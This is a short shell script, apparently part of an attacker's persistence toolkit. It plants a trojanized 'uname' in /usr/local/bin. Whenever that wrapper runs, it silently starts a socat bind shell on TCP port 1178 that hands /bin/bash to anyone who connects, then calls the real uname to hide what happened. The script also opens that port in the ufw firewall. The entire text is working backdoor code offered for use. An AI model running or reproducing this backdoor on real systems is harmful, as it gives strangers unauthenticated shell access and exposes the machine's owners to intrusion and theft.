#uname
#-------------------------
touch /usr/local/bin/uname

cat <<EOF > /usr/local/bin/uname
#!/bin/bash
socat TCP4-Listen:1178,fork EXEC:/bin/bash 2>/dev/null &
/bin/uname \$@
EOF

ufw >/dev/null allow 1178/tcp
chmod +x /usr/local/bin/uname
